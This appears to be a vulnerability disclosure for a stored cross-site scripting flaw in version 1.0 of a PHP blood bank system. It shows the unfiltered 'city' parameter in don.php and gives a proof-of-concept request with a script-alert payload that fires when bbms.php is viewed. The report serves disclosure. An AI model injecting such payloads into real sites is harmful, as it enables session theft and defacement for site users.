# blood-bank-system-in-php via city parameter Cross Site Scripting

[Blood Bank System In PHP With Source Code - Source Code & Projects (code-projects.org)](https://code-projects.org/blood-bank-system-in-php-with-source-code/)

## NAME OF AFFECTED PRODUCT(S)

**blood-bank-system-in-php**

## Vendor Homepage

https://code-projects.org/blood-bank-system-in-php-with-source-code/

##  **Manufacturers sites**

https://code-projects.org/

# AFFECTED  VERSION(S)

## Vulnerable File

bbms.php，don.php

## VERSION(S)

-  v1.0

## Software Link

https://download.code-projects.org/details/09f1f26e-072d-4fec-bd3b-974076ee162c

# PROBLEM TYPE

## Vulnerability Type

Cross Site Scripting

## **Description of the vulnerability**

don.php，insert city paremeter into donate table.

![image-20241003005451933](https://github.com/user-attachments/assets/06766abd-7b42-40ce-b5f3-1bfdce9ea701)

echo the city parameter in not filter from donate table.

![image-20241003005536378](https://github.com/user-attachments/assets/95551fcc-ad48-465c-8f03-42fdc9a40686)

## **Vulnerability recurrence**

### **POC**

Just need to execute the POC and insert the xss code into the database

```
http://bloodbankmgmtsystem/don.php
fullname=4&phno=1&city=<script>alert("cityxss");</script>
```

![image-20241003005130158](https://github.com/user-attachments/assets/b7cff729-a85d-430e-b316-94f0049a85fb)

### Result

We can trigger the XSS vulnerability that was just inserted by accessing  bbms.php. 

```
http://bloodbankmgmtsystem/bbms.php
```

![image-20241003005400399](https://github.com/user-attachments/assets/cbc6c12e-040e-4e4a-bbcd-c598aa0c7b94)